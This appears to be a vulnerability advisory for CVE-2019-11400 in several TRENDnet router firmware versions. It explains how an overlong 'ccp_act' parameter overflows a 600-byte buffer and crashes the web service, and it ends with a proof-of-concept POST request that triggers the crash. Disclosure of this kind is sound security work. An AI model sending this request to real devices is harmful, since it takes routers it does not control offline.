# TRENDNet

**Exploit Author**: pr0v3rbs@kaist.ac.kr

**Vender**: TRENDNet

## CVE-2019-11400

**Firmware version**:
TEW-651BR 2.04B1, TEW-652BRP 3.04b01, and TEW-652BRU 1.00b12

### The detail of vulnerability ###

When processing any type of 'get_set.ccp' POST request through web
service.

The 'ccp_act' parameter can trigger buffer overflow vulnerability. Once
trigger the buffer overflow, then the web server crashed and the web
service is downed.

The crafted sent data is converted with GET method style string, and it
transferred from mini_httpd web server to the ncc binary through the
socket communication.

The 'handle_nccinf_R1' function of ncc binary receive the data, and it
calls the 'data_2_entries' function of the libsw3box.so library with
the string. As like
```
"get_set.ccp?ccp_act=aaa...aaa&
ccpSubEvent=CCP_SUB_DDNS&
nextPage=ddns.htm&
ddnsCfg_DDNSEnable_1.1.0.0.0=1&
ddnsCfg_DDNSServer_1.1.0.0.0=DynDns.org&
ddnsCfg_HostName_1.1.0.0.0=&
ddnsCfg_Username_1.1.0.0.0=&
ddnsCfg_Password_1.1.0.0.0=WDB8WvbXdHtZyM8Ms2RENgHlacJghQyGWDB8WvbXdHtZyM8Ms2RENgHlacJghQyG&
ddnsCfg_Timeout_1.1.0.0.0=&
ip_addr=192.168.10.2"
```
And then, the 'data_2_entries' function parses the value of the
'ccp_act' parameter to the local buffer which has 600 sizes. At this
point, with the large buffer that overcomes 652 sizes, the local buffer
overflowed and, return address is corrupted.

### PoC POST message

```
POST /get_set.ccp HTTP/1.1

ccp_act=aaaaaaaaaaaaaaa...aaaaaaaaaa&
ccpSubEvent=CCP_SUB_DDNS&
nextPage=ddns.htm&
ddnsCfg_DDNSEnable_1.1.0.0.0=1&
ddnsCfg_DDNSServer_1.1.0.0.0=DynDns.org&
ddnsCfg_HostName_1.1.0.0.0=&
ddnsCfg_Username_1.1.0.0.0=&
ddnsCfg_Password_1.1.0.0.0=WDB8WvbXdHtZyM8Ms2RENgHlacJghQyGWDB8WvbXdHtZyM8Ms2RENgHlacJghQyG&
ddnsCfg_Timeout_1.1.0.0.0=
```